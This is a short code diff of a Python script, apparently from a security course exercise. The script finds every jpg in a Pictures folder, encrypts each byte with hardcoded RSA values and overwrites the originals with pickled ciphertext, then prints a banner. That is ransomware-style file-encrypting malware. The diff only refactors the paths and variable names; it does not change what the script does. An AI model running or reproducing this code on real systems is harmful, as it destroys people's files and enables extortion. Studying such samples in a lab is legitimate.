@@ -10,7 +10,7 @@ def print_banner():
 
 # Get filenames of all picture files in jpg in /home/csc2023/Pictures
 
-folder_path = '/app/Pictures'
+folder_path = '/app/Pictures/'
 jpg_files = []
 
 for filename in os.listdir(folder_path):
@@ -21,13 +21,13 @@ for filename in os.listdir(folder_path):
 n = 22291846172619859445381409012451
 e = 65535
 
-plain_bytes = b''
 for filename in jpg_files:
-    filename = '/app/Pictures/' + filename
+    filename = folder_path + filename
     with open(filename, 'rb') as f:
         plain_bytes = f.read()
-    cipher_int = [pow(i, e, n) for i in plain_bytes]
+        plain_int = [b for b in plain_bytes]
+        encrypted_int = [pow(i, e, n) for i in plain_int]
     with open(filename, 'wb') as f:
-        pickle.dump(cipher_int, f)
+        pickle.dump(encrypted_int, f)
 
 print_banner()
